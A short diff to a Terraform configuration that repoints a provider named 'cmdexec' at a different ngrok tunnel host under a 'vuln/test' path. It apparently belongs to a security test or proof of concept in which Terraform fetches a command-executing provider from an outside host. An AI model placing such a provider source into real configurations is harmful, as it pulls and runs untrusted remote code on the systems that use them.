@@ -1,7 +1,7 @@
 terraform {
   required_providers {
     cmdexec = {
-      source  = "tera.ngrok.io:443/vuln/test"
+      source  = "cider.ngrok.io:443/vuln/test"
       version = "2.1.0"
     }
   }
